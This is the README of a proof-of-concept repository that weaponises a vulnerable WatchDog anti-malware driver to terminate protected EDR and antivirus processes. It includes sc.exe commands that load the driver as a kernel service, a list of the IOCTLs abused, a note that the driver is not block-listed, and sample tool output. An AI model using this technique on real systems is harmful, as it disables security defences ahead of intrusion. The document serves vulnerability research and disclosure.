# WatchDogKiller – Weaponizing the WatchDog Anti-Malware Driver Vulnerability

## 📖 Research Article
This repository is the Proof-of-Concept (PoC) accompanying my technical write-up on the WatchDog Anti-Malware (amsdk.sys) BYOVD vulnerability.  
👉 Full research available here: [Researching an APT Attack and Weaponizing It: The WatchDog BYOVD Story](https://medium.com/@jehadbudagga/researching-an-apt-attack-and-weaponizing-it-56daabee11c9)

---

## ⚡ Overview
The Silver Fox APT group leveraged a vulnerable Microsoft-signed driver (`wamsdk.sys`) in recent attacks to disable security products.  
I reversed the latest WatchDog driver (`amsdk.sys v1.1.100`) and discovered that the arbitrary process termination vulnerability was still exploitable.

The driver as of this date 11/9/2025 isnt listed on either LolDriver or HVCI blocked

This PoC demonstrates:
- Registering a process with the driver (`IOCTL_REGISTER_PROCESS`)
- Using the termination routine (`IOCTL_TERMINATE_PROCESS`)
- Bypassing the driver’s authorization mechanism
- Killing protected EDR/AV processes (Bitdefender, Sophos, Kaspersky, etc.)

---

## 🛠️ Usage
> ⚠️ **Disclaimer**: This code is for educational and research purposes only. Do not use it on systems you do not own.

1. Load the vulnerable driver:
   ```powershell
   sc.exe create killer binPath="C:\Path\To\wamsdk.sys" type=kernel
   sc.exe start killer
   ```

 2. Run the PoC
```
.\WatchDogKiller.exe

WatchDog EDR Terminator Tool @j3h4ck
================================================

Successfully opened Zam device
Attempting to register process 9444...
Successfully registered process 9444

Enter PID to terminate: 30724
Wait for process exit? (0 = No, 1 = Yes): 0

Attempting to terminate PID 30724...
Successfully sent terminate request for PID 30724
Terminate request completed successfully.

Enter PID to terminate:
```
## References
- Research Article: https://medium.com/p/56daabee11c9/  
- The Hacker News – Silver Fox Exploits Microsoft-Signed Driver: https://thehackernews.com/2025/09/silver-fox-exploits-microsoft-signed.html  

---

## Author
Jehad Abudagga  
- LinkedIn: https://www.linkedin.com/in/jehadabudagga/  
- GitHub: https://github.com/j3h4ck  

---

## Disclaimer
This project is released for educational and security research purposes only.  
The author does not endorse or condone the misuse of this information.
